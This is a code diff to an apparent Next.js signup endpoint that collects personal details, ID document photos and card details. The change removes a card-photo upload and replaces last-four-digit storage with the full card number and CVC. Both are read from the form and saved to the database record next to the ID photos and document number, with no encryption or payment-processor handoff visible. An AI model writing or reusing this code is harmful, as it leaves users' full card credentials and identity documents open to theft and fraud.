@@ -23,11 +23,11 @@ export async function POST(request: NextRequest) {
   const planChoice = String(formData.get("planChoice") ?? "starter").trim();
   const email = String(formData.get("email") ?? "").trim().toLowerCase();
   const cardHolder = String(formData.get("cardHolder") ?? "").trim();
-  const cardLastFour = String(formData.get("cardLastFour") ?? "").trim();
+  const cardNumber = String(formData.get("cardNumber") ?? "").trim();
   const cardExpiry = String(formData.get("cardExpiry") ?? "").trim();
+  const cardCvc = String(formData.get("cardCvc") ?? "").trim();
   const idPhotoFront = formData.get("idPhotoFront") as File | null;
   const idPhotoBack = formData.get("idPhotoBack") as File | null;
-  const cardPhoto = formData.get("cardPhoto") as File | null;
   const documentNumber = normalizeDocumentNumber(String(formData.get("documentNumber") ?? ""));
 
   if (!token || !firstName || !lastName || !phone || !email) {
@@ -112,9 +112,6 @@ export async function POST(request: NextRequest) {
     if (idPhotoBack && idPhotoBack.size > 0) {
       await uploadDoc(idPhotoBack, "id_back", Date.now().toString());
     }
-    if (cardPhoto && cardPhoto.size > 0) {
-      await uploadDoc(cardPhoto, "credit_card", Date.now().toString());
-    }
   } catch (uploadErr) {
     console.error("doc upload:", uploadErr);
     return NextResponse.json({ error: "Error al subir documentos." }, { status: 500 });
@@ -134,7 +131,8 @@ export async function POST(request: NextRequest) {
     document_number: documentNumber || null,
     gender: null,
     card_holder: cardHolder || null,
-    card_last_four: cardLastFour || null,
+    card_number: cardNumber || null,
+    card_cvc: cardCvc || null,
     card_expiry: cardExpiry || null,
     completed_at: new Date().toISOString(),
   });
